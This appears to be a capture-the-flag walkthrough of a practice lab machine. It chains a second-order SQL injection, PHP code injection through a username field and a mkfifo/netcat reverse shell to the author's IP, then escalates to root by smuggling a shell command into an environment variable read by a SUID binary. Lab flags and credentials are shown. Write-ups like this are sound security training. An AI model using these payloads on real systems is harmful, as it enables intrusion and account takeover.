# 52 - WWBuddy (second order sql injection, env variables exploitation)

Room Link --> [https://tryhackme.com/room/wwbuddy](https://tryhackme.com/room/wwbuddy)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n 10.10.68.255 -v -p- -sV -T5
```
{% endcode %}

#### FFUF Enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u http://10.10.68.255/FUZZ -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403,400 -t 500 -ic

# outputs
images
profile
js
api
styles
login
register
change
```
{% endcode %}

Navigating to `http://10.10.68.255/change/`- gives a change password page..

<figure><img src=".gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

### Exploit Website <a href="#exploit-website" id="exploit-website"></a>

I tried to do my best to not let any sqli os xss and some other things in the login, chat and in the user info, in this part I wanted to explore second order sql injection.

Okay, we can change the username, let’s change it to some sqli payload like `' or 1=1 -- a` and then change the password.

If everything went right, the passwords of every user in the database now should be the same, but we dont have the username of another user to try to log in, or do we?

The WWBuddy bot sends a message to every user that is registered, so let’s try to login with the username WWBuddy and the password that we just changed.

Logged in as WWBuddy we can see a 2 new faces, Henry and Roberto, first let’s try to enter the /admin page… We still dont have permission, so let’s try to login as one of the two.

I logged in as Roberto, he has some messages with Henry and by their messages, it looks like Henry is the admin, they are talking about changing the password used for new users in SSH and also about a new developer being hired, let’s forget it for now and let’s login with Henry because probably he will have rights to access /admin.

Logging in as Henry we can enter /admin, in it there’s a log showing the ip, date, username and id of everytime anyone tried to access /admin page, let’s look at the source of the page.

Looking at the source we can see 2 interesting things, first there is the first flag and second, at the end of every line there is a \<br> to break the line, okay, maybe the backend is using include() to show the logs, let’s see if it executes php code.

Log in as a the `wwbuddy` user, change the username to some php code and try to access `/admin`  page,&#x20;

```php
<?php echo system("id"); ?>
```

then go back to Henry and in `/admin`  page you can see the code was executed. We have RCE.

<figure><img src=".gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

### Rev Shell

Then setup a netcat listener and go back to /admin as Henry and in the url we can type some command to get a reverse shell. I use the python reverse shell from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

The php code has been executed! So, instead of “id”, I will change the code to spawn a reverse shell! Because the username cannot exceed 50 characters, so I will write a **shell.sh** from my machine, and then use php to wget this shell.

content of **shell.sh**:

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9001

Start a http server or your machine:

> python3 -m http.server 9000\
>

Then start a listener:

> nc -lvnp 9001

Then change the username of **wwbuddy** to:

> \<?php system(‘wget \<your-VPN-ip>:9000/shell.sh’) ?>

Again, access /admin, logout, login as Henry and access /admin.

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*Ou2I5ymIZGNosm8m3W-nfA.png" alt="" height="57" width="700"><figcaption><p>transfer</p></figcaption></figure>

The **shell.sh** has been transferred. Ok, now change the username to exec this **shell.sh:**

<figure><img src="https://miro.medium.com/v2/resize:fit:456/1*4a462h3XkSO0bwCEcH1F2g.png" alt="" height="258" width="663"><figcaption></figcaption></figure>

Doing the same steps above to exec this php code, and you will have the shell into the machine!

<figure><img src="https://miro.medium.com/v2/resize:fit:430/1*35uyx0_0ch-aCR_ZpJ4ZWA.png" alt="" height="132" width="626"><figcaption><p>reverse shell</p></figcaption></figure>

Spawn a tty shell using **Python:**

> python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
>
> export TERM=xterm

<figure><img src="https://miro.medium.com/v2/resize:fit:399/1*G5sV7AuyXhE449SiBz6DKQ.png" alt="" height="80" width="581"><figcaption><p>tty shell</p></figcaption></figure>

### Priv Esc to Roberto

We run LinPEAS.sh to enumerate the box.

We identified this file: `/usr/bin/gettext.sh` .

<figure><img src=".gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

Mysql is also running internally, since the port is not open externally.

<figure><img src=".gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>

We see some interesting log files.

<figure><img src=".gitbook/assets/image (375).png" alt=""><figcaption></figcaption></figure>

It contains credentials for Roberto user, when we can the file contents out:

```bash
www-data@wwbuddy:/tmp$ cat /var/log/mysql/general.log

# output
2020-07-25T15:01:40.143760Z	   12 Execute	SELECT id, username, password FROM users WHERE username = 'RobertoyVnocsXsf%X68wf'
2020-07-25T15:02:00.019056Z	   13 Execute	SELECT id, username, password FROM users WHERE username = 'Roberto'

# new credentials.
Roberto : yVnocsXsf%X68wf
```

So it could be password for `roberto` acct or mysql db password. I tried switching to `roberto` user and it worked.

<figure><img src=".gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Jenny

In roberto home dir, there is a file.

{% code overflow="wrap" %}
```bash
roberto@wwbuddy:/home$ cd roberto/
roberto@wwbuddy:~$ ls -al
total 32
drwx------ 4 roberto roberto 4096 Nov  2 11:58 .
drwxr-xr-x 5 root    root    4096 Jul 28  2020 ..
-rw------- 1 roberto roberto    0 Jul 28  2020 .bash_history
-rw-r--r-- 1 roberto roberto  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 roberto roberto 3771 Apr  4  2018 .bashrc
drwx------ 3 roberto roberto 4096 Nov  2 11:58 .gnupg
-rw-rw-r-- 1 roberto roberto  246 Jul 27  2020 importante.txt
drwxrwxr-x 3 roberto roberto 4096 Jul 27  2020 .local
-rw-r--r-- 1 roberto roberto  807 Apr  4  2018 .profile
roberto@wwbuddy:~$ cat importante.txt 
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.

THM{g4d0_d+_kkkk}
roberto@wwbuddy:~$ 
```
{% endcode %}

ChatGPT recognized it as Portugese and translated:

{% code overflow="wrap" lineNumbers="true" %}
```
"A Jenny will be very happy when she finds out she got hired :DD

Don't forget that next week she turns 26 years old. When she sees the gift I bought for her, maybe she'll even feel like going on a date with me."
```
{% endcode %}

So Jenny is the new employee, and from the messages btw Roberto and Henry in the web server, Default passwords for users is their date of birth. So we need to figure out Jenny correct date of birth. The date pattern is **mm/dd/yyyy.**

We also know the file was created on **27–07–2020 (Monday)**. Next week, Logically Jenny will be 26, so her date of birth  will be `08/03/1994` . Thats her ssh password.

We logged in ssh as `jenny : 08/03/1994`

### Priv Esc to root

I ran `/suid3num.py` to enumerate all interesting suid binaries and found.

<figure><img src=".gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

It’s not a default linux command. So let’s see what it does:

> /bin/authenticate

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*zTEcP8cF0IUEBfBZiRuOKg.png" alt="" height="163" width="700"><figcaption></figcaption></figure>

Ok so it will add **jenny** to group developer and spawn a new shell. Let’s transfer this file to our machine and use **ghidra** to decompile it.

<figure><img src="https://miro.medium.com/v2/resize:fit:431/1*5TCfh-t1LO3xJ2unj4buOA.png" alt="" height="544" width="627"><figcaption><p>ghidra</p></figcaption></figure>

If you’re in group “developer”, then it will print out “you are already a developer”. But if you are not, it will get variable from env “USER”, then set uid to 0 (uid of root). So if I change the “USER” env to a command, I can execute it at root!

> `export USER=’jenny; sh’`&#x20;

Then exec **/bin/authenticate**:

```bash
jenny@wwbuddy:~$ echo $USER
jenny
jenny@wwbuddy:~$ export USER="jenny; sh"
jenny@wwbuddy:~$ echo $USER
jenny; sh
jenny@wwbuddy:~$ /bin/authenticate
# id
uid=0(root) gid=1002(jenny) groups=1002(jenny)
# cd /root
# ls
root.txt
# cat root.txt
THM{ch4ng3_th3_3nv1r0nm3nt}
#        

```

\
DOne!

